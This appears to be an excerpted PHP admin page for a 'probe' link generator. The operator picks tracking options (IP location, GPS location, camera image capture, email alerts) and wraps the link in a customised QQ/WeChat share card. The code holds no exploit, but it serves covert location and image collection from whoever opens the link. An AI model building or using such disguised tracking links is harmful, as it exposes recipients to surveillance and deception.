...
<!---广告---->
<p class="layui-elem-quote"><a href="/share.php">邀请卡片生成器</a></p>
<fieldset class="layui-elem-field">
  <legend>探针添加</legend>
    ...
    <div class="layui-input-block">
      ...
      <input name="add_gps_location_function" title="授权定位（微信/QQ）" type="checkbox">
...
<?php
$action=$DB->escape(is_string($_GET['action'] ?? null) ? $_GET['action'] : '');
if($action=="probe_add"){
	
	$add_key=$DB->escape(is_string($_POST['add_key'] ?? null) ? $_POST['add_key'] : '');
	$add_probe_page=$DB->escape(is_string($_POST['add_probe_page'] ?? null) ? $_POST['add_probe_page'] : '');
	$add_ip_location_function=$DB->escape(is_string($_POST['add_ip_location_function'] ?? null) ? $_POST['add_ip_location_function'] : '');
	$add_gps_location_function=$DB->escape(is_string($_POST['add_gps_location_function'] ?? null) ? $_POST['add_gps_location_function'] : '');
	$add_camera_img_function=$DB->escape(is_string($_POST['add_camera_img_function'] ?? null) ? $_POST['add_camera_img_function'] : '');
	$add_email_notification_function=$DB->escape(is_string($_POST['add_email_notification_function'] ?? null) ? $_POST['add_email_notification_function'] : '');
	$add_email=$DB->escape(is_string($_POST['add_email'] ?? null) ? $_POST['add_email'] : '');
	$add_qqshare_title=$DB->escape(is_string($_POST['add_qqshare_title'] ?? null) ? $_POST['add_qqshare_title'] : '');
	$add_qqshare_pics=$DB->escape(is_string($_POST['add_qqshare_pics'] ?? null) ? $_POST['add_qqshare_pics'] : '');
	$add_qqshare_summary=$DB->escape(is_string($_POST['add_qqshare_summary'] ?? null) ? $_POST['add_qqshare_summary'] : '');
	$add_qqshare_desc=$DB->escape(is_string($_POST['add_qqshare_desc'] ?? null) ? $_POST['add_qqshare_desc'] : '');
	if ($add_key=="" or $add_probe_page=="" or $add_qqshare_title=="" or $add_qqshare_pics=="" or $add_qqshare_summary=="" or $add_qqshare_desc==""){
	}
	else{
	...
	layui.use("layer", function(){
	 ...
	 layer.open({
	  ...
	  ,content:"生成成功"
            ...
            $url='http://'.$_SERVER['HTTP_HOST'].'/probe.php?key='.rawurlencode(stripslashes($add_key));
            echo '<p class="layui-elem-quote"><a href="/share.php?key='.rawurlencode(stripslashes($add_key)).'">生成微信邀请图片卡片</a></p>';
            $qq=qqshare($url,stripslashes($add_qqshare_title),stripslashes($add_qqshare_pics),stripslashes($add_qqshare_summary),stripslashes($add_qqshare_desc));
            echo '<p class="layui-elem-quote">生成成功，微信/QQ通用链接：<a href="'.htmlspecialchars($url,ENT_QUOTES).'">'.htmlspecialchars($url,ENT_QUOTES).'</a><br><a target="_blank" rel="noopener" href="'.htmlspecialchars($qq,ENT_QUOTES).'">分享到QQ</a></p>';
...
<p class="layui-elem-quote">2.对方主动授权并确认提交后，管理员可在探针查询中查看本次位置</p>
